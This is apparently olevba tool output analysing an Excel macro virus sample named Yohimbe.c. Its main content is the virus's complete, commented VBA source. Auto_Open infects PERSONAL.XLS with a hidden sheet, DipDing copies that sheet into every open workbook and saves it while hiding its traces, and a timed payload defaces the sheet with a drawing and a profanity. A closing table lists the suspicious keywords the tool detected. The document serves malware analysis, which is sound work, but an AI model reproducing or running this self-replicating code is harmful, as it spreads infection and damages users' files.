olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Yohimbe.c-9e71126c8e711019ff5b4f8acdb2ee6fad6aa7a3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Yohimbe.c-9e71126c8e711019ff5b4f8acdb2ee6fad6aa7a3 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List1.cls 
in file: Virus.MSExcel.Yohimbe.c-9e71126c8e711019ff5b4f8acdb2ee6fad6aa7a3 - OLE stream: '_VBA_PROJECT_CUR/VBA/List1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List2.cls 
in file: Virus.MSExcel.Yohimbe.c-9e71126c8e711019ff5b4f8acdb2ee6fad6aa7a3 - OLE stream: '_VBA_PROJECT_CUR/VBA/List2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List3.cls 
in file: Virus.MSExcel.Yohimbe.c-9e71126c8e711019ff5b4f8acdb2ee6fad6aa7a3 - OLE stream: '_VBA_PROJECT_CUR/VBA/List3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul 1.bas 
in file: Virus.MSExcel.Yohimbe.c-9e71126c8e711019ff5b4f8acdb2ee6fad6aa7a3 - OLE stream: '_VBA_PROJECT_CUR/VBA/Modul 1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
                                The YohimBe Virus
                                ~~~ ~~~~~~~ ~~~~~

Here 's the Excel Macro Virus Yohimbe for you...  I have disassembled it so you can see
what is going on!

MACRO Auto_Open

Sub Auto_Open()
    On Error GoTo FixIt 'Errorhandler
    'Set up infected book as a variable
    Dim SaveBook As String
    SaveBook = ActiveWorkbook.Name
    Application.ScreenUpdating = False 'Don't want to see it working
    ' Check Personal.xls for prior infection
    Windows("PERSONAL.XLS").Visible = True
        If SheetExists("Exec") Then
        Windows("PERSONAL.XLS").Visible = False
        GoTo AlreadyInfected
        Else
    ' Infect Personal.xls
    Workbooks(SaveBook).Activate
    Sheets("Exec").Visible = True
    Sheets("Exec").Select
    Sheets("Exec").Copy Before:=Workbooks("PERSONAL.XLS").Sheets(1)
    Workbooks("PERSONAL.XLS").Activate
    ActiveWorkbook.Sheets("Exec").Visible = False
    ActiveWindow.Visible = False
    Workbooks("PERSONAL.XLS").Save
AlreadyInfected:  ' Return to originally opened book
    Workbooks(SaveBook).Activate
    ActiveWorkbook.Sheets("Exec").Visible = False
    End If
    GoTo OhKay
FixIt:  ' In case of error infect everything that's open
    DipDing
    End
OhKay:  ' Set time to infect all open books
    Application.OnTime EarliestTime:=TimeValue("4:00 PM"), _
    Procedure:="DipDing"
End Sub
 
MACRO DipDing

Sub DipDing() ' Routine to infect all open books
    On Error GoTo DipFix ' Set up error handler
    Application.ScreenUpdating = False
    Dim book As Object
    Dim CurrBook As String
    CurrBook = ActiveWorkbook.Name
        'Check each open book for infection, infect if not already infected
        For Each book In Workbooks
        book.Activate
            If SheetExists("Exec") Then
            GoTo Done
            Else
    Windows("PERSONAL.XLS").Visible = True
    Windows("PERSONAL.XLS").Activate
    Sheets("Exec").Visible = True
    Sheets("Exec").Copy Before:=book.Sheets(1)
    Sheets("Exec").Visible = False
    ActiveSheet.PageSetup.RightHeader = "Yohimbe"
    book.Save
Done:
    End If
    Next book
    'Cover your tracks
    Windows("PERSONAL.XLS").Activate
    Sheets("Exec").Visible = False
    Windows("PERSONAL.XLS").Visible = False
    Workbooks(CurrBook).Activate
    Application.OnTime EarliestTime:=TimeValue("4:45 PM"), _
    Procedure:="PayLoad"
DipFix:
End Sub

Function SheetExists(sName As String) As Boolean 'Infection checker function
    Dim aSheet As Object
    SheetExists = False
    For Each aSheet In ActiveWorkbook.Sheets
        If (StrComp(aSheet.Name, sName, 1) = 0) Then
        SheetExists = True
        End If
    Next aSheet
End Function

MACRO PayLoad

Sub PayLoad()
    Cells.Select
    Range("B1").Activate
    Selection.RowHeight = 15
    Selection.ColumnWidth = 2.5
    Range("B9,C10,D11,D12,E13,F14,F15,G15,H15,I15,J15,K15,L15,M15,M14,N13,N12,N11,N10,N9,N8,N7,M7,L7,L8,L9,K7,J9,J8,J7,J6,J5,J4,J3,J2,I2,H2,H3,H4,H5,H6,H7,H8,H9,G7,F7,F8,F9,F10,E9,D8,C8,B8,H1,I1,J1").Select
    With Selection.Interior
        .ColorIndex = 16
        .Pattern = xlSolid
        .PatternColorIndex = xlAutomatic
    End With
    Range("F12").Select
    ActiveCell.FormulaR1C1 = "FUCK YOU BUDDY"
    Range("F12").Select
    Selection.Font.Bold = True
    With Selection.Font
        .Name = "Arial"
        .FontStyle = "Bold"
        .Size = 16
    End With
    For mover = 1 To 20
    Range("H1:J6").Select
    Selection.Interior.ColorIndex = xlNone
    Application.Wait Now + TimeValue("00:00:01")
    Range("H6,H5,H4,H3,H2,H1,I1,J1,J2,I2,J3,J4,J5,J6").Select
    With Selection.Interior
        .ColorIndex = 16
        .Pattern = xlSolid
        .PatternColorIndex = xlAutomatic
    End With
    Application.Wait Now + TimeValue("00:00:01")
    Next mover
    Range("A4").Select
    End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

